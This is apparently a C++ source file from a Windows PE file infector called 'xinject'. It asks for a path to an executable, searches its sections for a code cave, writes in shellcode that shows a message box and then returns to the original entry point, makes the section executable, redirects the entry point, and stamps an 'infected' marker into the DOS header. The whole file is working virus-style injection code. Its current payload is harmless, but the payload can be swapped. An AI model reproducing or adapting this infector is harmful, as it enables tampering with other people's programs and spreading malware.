#include "inject_w.h"
#include <windows.h>
#include <stdio.h>


void shellcode()
{
    const int szCaption = 13;
    const int szText = 37;
    x64::pushad{};
    x64::call<4>{};
    x64::popq<x64::rbp>{};
    x64::add<x64::rbp,-4>{};
    x64::pushq<x64::r9>{};
    x64::lea<x64::rax, x64::rbp, szCaption>{};
    x64::pushq<x64::rax>{};
    x64::lea<x64::rax, x64::rbp, szText>{};
    x64::pushq<x64::rax>{};
    x64::mov<x64::rax, 0xAAAAAAA>{};
    x64::call<0>{};
    x64::popad{};
    x64::pushq<x64::rax>{};
    x64::ret{};
}

void markAsInfected(PIMAGE_DOS_HEADER pidh)
{
  pidh->e_minalloc = 0x13;
  pidh->e_maxalloc = 0x37;
}


BOOL isInfected(PIMAGE_DOS_HEADER pidh)
{
  return ((pidh->e_minalloc == 0x13) && (pidh->e_maxalloc == 0x37));
}

void markAsInfected(PIMAGE_DOS_HEADER pidh);



CODE_CAVE findCodeCave(LPBYTE lpFile, PEParser* ppeParser)
{

  CODE_CAVE ccCave;

  DWORD     dwCount = 0;
  ccCave.dwPosition = 0;
  ccCave.pish       = NULL;

  for (int i = 1; i <= ppeParser->getNumberOfSections(); i++)
  {
      ccCave.pish = ppeParser->getSectionHeader(i);

      for (int j = 0; j < ccCave.pish->SizeOfRawData; j++)
      {
          if (*(lpFile + ccCave.pish->PointerToRawData + j) == 0x00)
          {
              if (dwCount++ == (SHELLCODE_SIZE + 1))
              {
                  ccCave.dwPosition = j - SHELLCODE_SIZE +
                      ccCave.pish->PointerToRawData + 1;
                  break;
              }
          }
          else
          {
              dwCount = 0;
          }
      }

      if (ccCave.dwPosition != 0)
      {
          break;
      }
  }

  if (dwCount == 0 || ccCave.dwPosition == 0)
  {
      return CODE_CAVE{ 0, NULL };
  }
  else
  {
      return ccCave;
  }
}

void modificateShellcode(LPVOID lpShellcode, DWORD dwOEP)
{
  HMODULE hModule = LoadLibrary(TEXT("user32.dll"));
  FARPROC lpMessageBoxA = GetProcAddress(hModule, "MessageBoxA");

  for (int i = 0; i < SHELLCODE_SIZE; i++)
  {
      if (*(LPDWORD(lpShellcode) + i) == 0xAAAAAAAA)
      {
          *(LPDWORD(lpShellcode) + i) = DWORD_PTR(lpMessageBoxA );
          FreeLibrary(hModule);
          break;
      }
  }

  for (int i = 0; i < SHELLCODE_SIZE; i++)
  {
      if (*(LPDWORD(lpShellcode) + i) == 0xAAAAAAAA)
      {
          *(LPDWORD(lpShellcode) + i) = dwOEP;
          break;
      }
  }
}


namespace xinject {
namespace windows {

template<typename T>
void inject(const std::string &path, const T &binary) {
  std::cout << "Hello from Windows OS!" << std::endl;
    
  //Creating simple window
  MessageBoxA(0, "Hello world!", "Hello world!", 0);


  std::string pathToExe;
  std::cout << "Enter path to the file please:";
  std::cin >> pathToExe;

  LPTSTR pathStr = new TCHAR[pathToExe.size() + 1];
  strcpy(pathStr, pathToExe.c_str());

  MappedFile* pfTarget;
  try
  {
      pfTarget = new MappedFile(pathStr);
  }
  catch (const std::exception& e)
  {
      std::cerr << "[ERROR] " << e.what() << std::endl;
      std::cerr << "GetLastError(): " << GetLastError() << std::endl;
      return ;
  }

  LPBYTE lpFile = pfTarget->getViewOfFile();

  PEParser* pePars;
  try
  {
      pePars = new PEParser(lpFile);
  }
  catch (const std::exception& e)
  {
      std::cerr << "[ERROR] " << e.what() << std::endl;
      std::cerr << "GetLastError(): " << GetLastError() << std::endl;

      delete pfTarget;
      return ;
  }

  PIMAGE_DOS_HEADER      pidh  = pePars->getDosHeader();
  PIMAGE_NT_HEADERS      pinh  = pePars->getNtHeaders();
  PIMAGE_FILE_HEADER     pifh  = pePars->getFileHeader();
  PIMAGE_OPTIONAL_HEADER pioh  = pePars->getOptionalHeader();
  DWORD                  dwOEP = pioh->AddressOfEntryPoint + pioh->ImageBase;

  if (isInfected(pidh))
  {
      std::cerr << "[ERROR] File already infected!" << std::endl;

      delete pePars;
      delete pfTarget;
      return ;
  }

  CODE_CAVE cCave = findCodeCave(lpFile, pePars);
  if ((cCave.pish == NULL) || (cCave.dwPosition == 0))
  {
      std::cerr << "[ERROR] Can't find code cave!" << std::endl;

      delete pePars;
      delete pfTarget;
      return ;
  }
  std::cout << "[INFO] Code cave located at 0x" << LPVOID(cCave.dwPosition) << std::endl;
  PIMAGE_SECTION_HEADER pish       = cCave.pish;
  DWORD                 dwPosition = cCave.dwPosition;

  LPVOID lpShellcode = new char[SHELLCODE_SIZE];
  RtlSecureZeroMemory(lpShellcode, SHELLCODE_SIZE);
  memcpy(lpShellcode, (void *)shellcode, SHELLCODE_SIZE);
  modificateShellcode(lpShellcode, dwOEP);

  memcpy(LPBYTE(lpFile + dwPosition), lpShellcode, SHELLCODE_SIZE);
  pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
  pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;
  markAsInfected(pidh);

  std::cout << "[SUCCESS] File successfuly infected!" << std::endl;

  delete lpShellcode;
  delete pePars;
  delete pfTarget;
}



} // namespace windows
} // namespace xinject
